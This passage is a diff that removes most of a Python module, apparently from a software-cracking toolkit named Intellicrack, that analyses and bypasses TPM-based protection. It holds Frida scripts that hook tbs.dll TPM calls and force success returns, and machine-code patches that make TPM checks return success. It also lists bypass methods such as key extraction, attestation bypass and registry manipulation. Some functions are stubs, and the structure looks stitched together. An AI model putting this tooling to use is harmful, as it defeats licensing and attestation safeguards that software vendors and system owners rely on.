-                "Monitor system stability after applying bypass",
-                "Consider using virtual TPM for safer emulation",
-            ]
-        )
-
-        return bypass_config
-
-    def _generate_hook_script(self, tpm_version: str) -> str:
-        """Generate Frida hook script for TPM bypass."""
-        if tpm_version == "2.0":
-            return """
-// TPM 2.0 Bypass Hook Script
-var tbs = Process.getModuleByName('tbs.dll');
-var ncrypt = Process.getModuleByName('ncrypt.dll');
-
-// Hook Tbsi_Submit_Command for TPM 2.0
-var Tbsi_Submit_Command = tbs.getExportByName('Tbsi_Submit_Command');
-Interceptor.attach(Tbsi_Submit_Command, {
-    onEnter: function(args) {
-        console.log('[TPM] Command intercepted');
-        this.cmdBuffer = args[4];
-        this.respBuffer = args[6];
-    },
-    onLeave: function(retval) {
-        // Return success
-        retval.replace(0);
-    }
-});
-"""
-        return """
-// TPM 1.2 Bypass Hook Script
-var tbs = Process.getModuleByName('tbs.dll');
-
-// Hook legacy TPM functions
-Interceptor.attach(tbs.getExportByName('Tbsi_Context_Create'), {
-    onLeave: function(retval) {
-        console.log('[TPM] Context creation bypassed');
-        retval.replace(0);
-    }
-});
-"""
-
-    def _identify_patch_points(self) -> list[dict[str, Any]]:
-        """Identify potential patch points in binary."""
-        patch_points = []
-
-        if self.binary_path and self.tpm_indicators:
-            # Simulate patch point identification
-            for indicator in self.tpm_indicators:
-                patch_points.append(
-                    {
-                        "type": "api_call",
-                        "location": f"Call to {indicator}",
-                        "patch": b"\x31\xc0\x40\xc3",  # xor eax,eax; inc eax; ret (return 1/success)
-                    }
-                )
-
-        return patch_points
-
-    def _generate_emulator_config(self, tpm_version: str) -> dict[str, Any]:
-        """Generate TPM emulator configuration."""
-        return {
-            "version": tpm_version,
-            "emulation_level": "full" if tpm_version == "2.0" else "basic",
-            "supported_commands": [
-                "TPM2_Startup",
-                "TPM2_CreatePrimary",
-                "TPM2_Load",
-                "TPM2_Sign",
-                "TPM2_PCR_Read",
-            ]
-            if tpm_version == "2.0"
-            else [
-                "TPM_Startup",
-                "TPM_CreateWrapKey",
-                "TPM_LoadKey",
-                "TPM_Sign",
-            ],
-            "key_storage": "memory",
-            "persistence": False,
-        }
-
-
-def analyze_tpm_protection(binary_path: str) -> dict[str, Any]:
-    """Analyze a binary for TPM protection mechanisms.
-
-    Args:
-        binary_path: Path to the binary to analyze
-
-    Returns:
-        dict: Analysis results
-
-    """
-    analyzer = TPMAnalyzer(binary_path)
-    return analyzer.analyze()
-
-
-def detect_tpm_usage(process_name: str | None = None) -> bool:
-    """Detect if a process is using TPM functionality.
-
-    Args:
-        process_name: Name of the process to check (optional)
-
-    Returns:
-        bool: True if TPM usage detected
-
-    """
-    logger = logging.getLogger("IntellicrackLogger.TPMAnalyzer")
-
-    if platform.system() != "Windows":
         return False
-
-    try:
-        import subprocess
-
-        # Check if TPM service is running
-        result = subprocess.run(
-            ["sc", "query", "TPM"],  # noqa: S607
-            capture_output=True,
-            text=True,
-            check=False,
-        )
-        tpm_service_running = "RUNNING" in result.stdout
-
-        # If process name specified, check if it's using TPM
-        if process_name and tpm_service_running:
-            logger.debug(f"Checking if process '{process_name}' uses TPM")
-
-            # Check if process has TPM-related DLLs loaded
-            try:
-                # Use tasklist to check loaded modules
-                tasklist_result = subprocess.run(
-                    ["tasklist", "/m", "tbs.dll"],  # noqa: S607
-                    capture_output=True,
-                    text=True,
-                    check=False,
-                )
-                if process_name.lower() in tasklist_result.stdout.lower():
-                    logger.info(f"Process '{process_name}' is using TPM (tbs.dll loaded)")
-                    return True
-
-                # Check for NCrypt TPM provider
-                tasklist_result = subprocess.run(
-                    ["tasklist", "/m", "ncrypt.dll"],  # noqa: S607
-                    capture_output=True,
-                    text=True,
-                    check=False,
-                )
-                if process_name.lower() in tasklist_result.stdout.lower():
-                    # Further check if using TPM provider specifically
-                    logger.debug(f"Process '{process_name}' has ncrypt.dll loaded, checking TPM usage")
-                    # This is a heuristic - processes with ncrypt.dll might use TPM
-                    return True
-
-            except (OSError, ValueError) as e:
-                logger.debug(f"Error checking process modules: {e}")
-
-        return tpm_service_running
-
-    except (OSError, ValueError, RuntimeError) as e:
-        # TPM service check failed - log and return False
-        logger.debug("TPM service check failed: %s", e)
-        return False
-
-
-def tpm_research_tools() -> dict[str, Any]:
-    """Get available TPM research tools and utilities.
-
-    Returns:
-        dict: Available tools and their capabilities
-
-    """
-    return {
-        "analyzer": TPMAnalyzer,
-        "bypass": TPMProtectionBypass,
-        "functions": {
-            "analyze_tpm_protection": analyze_tpm_protection,
-            "detect_tpm_usage": detect_tpm_usage,
-            "bypass_tpm_protection": bypass_tpm_protection,
-        },
-        "capabilities": [
-            "TPM API hooking",
-            "Virtual TPM emulation",
-            "Binary patching",
-            "Registry manipulation",
-            "Runtime bypass",
-        ],
-    }
-
-    def get_available_bypass_methods(self) -> list[str]:
-        """Get list of available TPM bypass methods."""
-        return [
-            "api_hooking",
-            "virtual_tpm",
-            "binary_patching",
-            "registry_manipulation",
-            "pcr_manipulation",
-            "key_extraction",
-            "attestation_bypass",
-            "seal_unseal_bypass",
-        ]
-
-    def activate_bypass(self, method: str = "auto", target_info: dict[str, Any] | None = None) -> dict[str, Any]:
-        """Activate specified TPM bypass method."""
-        result = {"success": False, "method": method, "details": {}, "notes": []}
-
-        # Auto-select method if needed
-        if method == "auto":
-            if self._has_frida_support():
-                method = "api_hooking"
-            elif self._can_patch_binary():
-                method = "binary_patching"
-            else:
-                method = "virtual_tpm"
-
-        # Execute bypass based on method
-        if method == "api_hooking":
-            try:
-                self._hook_tpm_apis()
-                result["success"] = True
-                result["details"] = {"hooked_apis": self.hooked_apis}
-                result["notes"].append("TPM APIs successfully hooked")
-            except Exception as e:
-                result["notes"].append(f"API hooking failed: {e}")
-
-        elif method == "virtual_tpm":
-            try:
-                self._create_virtual_tpm()
-                result["success"] = True
-                result["details"] = {"virtual_tpm": self.virtual_tpm}
-                result["notes"].append("Virtual TPM created successfully")
-            except Exception as e:
-                result["notes"].append(f"Virtual TPM creation failed: {e}")
-
-        elif method == "binary_patching":
-            if self.binary_path:
-                success = self._patch_tpm_calls(self.binary_path)
-                result["success"] = success
-                if success:
-                    result["notes"].append("Binary successfully patched")
-                else:
-                    result["notes"].append("Binary patching failed")
-            else:
-                result["notes"].append("No binary path specified")
-
-        elif method == "registry_manipulation":
-            try:
-                self._manipulate_tpm_registry()
-                result["success"] = True
-                result["notes"].append("Registry manipulation successful")
-            except Exception as e:
-                result["notes"].append(f"Registry manipulation failed: {e}")
-
-        else:
-            result["notes"].append(f"Unknown bypass method: {method}")
-
-        return result
-
-    def _has_frida_support(self) -> bool:
-        """Check if Frida is available for API hooking."""
-        return FRIDA_AVAILABLE
-
-    def _can_patch_binary(self) -> bool:
-        """Check if binary patching is possible."""
-        return self.binary_path and os.path.exists(self.binary_path)
-
-
-# Export the main classes and functions
-__all__ = [
-    "TPMAnalyzer",
-    "TPMProtectionBypass",
-    "analyze_tpm_protection",
-    "bypass_tpm_protection",
-    "detect_tpm_usage",
-    "tpm_research_tools",
-]
